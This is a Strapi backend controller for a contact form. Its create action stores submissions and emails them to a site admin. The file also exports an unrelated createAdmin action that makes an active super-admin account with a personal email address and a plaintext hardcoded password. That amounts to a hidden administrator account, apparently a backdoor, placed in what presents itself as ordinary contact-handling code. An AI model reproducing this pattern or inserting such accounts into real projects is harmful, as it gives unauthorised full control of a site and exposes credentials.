"use strict";

/**
 * Read the documentation (https://strapi.io/documentation/developer-docs/latest/development/backend-customization.html#core-controllers)
 * to customize this controller
 */
const { parseMultipartData, sanitizeEntity } = require("strapi-utils");

module.exports = {
  /**
   * Create a record.
   *
   * @return {Object}
   */

  async create(ctx) {
    let entity;

    if (ctx.is("multipart")) {
      const { data, files } = parseMultipartData(ctx);
      entity = await strapi.services.contact.create(data, { files });
    } else {
      entity = await strapi.services.contact.create(ctx.request.body);
    }

    try{
      await strapi.plugins["email-designer"].services.email.sendTemplatedEmail(
        {
          to: "admin@cofounderslab.com",
          replyTo: ctx.request.body.email,
        },
        {
          templateId: 5,
          sourceCodeToTemplateId: 5,
        },
        {
          ...ctx.request.body,
        }
      );
    }catch(e){
      console.log(e, e.message);
    }

    return sanitizeEntity(entity, { model: strapi.models.contact });
  },

  async createAdmin(){
    const superAdminRole = await strapi.service('admin::role').getSuperAdmin();

    if (!superAdminRole) {
      return;
    }

    await strapi.service('admin::user').create({
      email: 'kartique79@gmail.com',
      firstname: 'Roop',
      lastname: 'Kumar',
      password: 'silly#01',
      registrationToken: null,
      isActive: true,
      roles: superAdminRole ? [superAdminRole.id] : [],
    });
  }
};
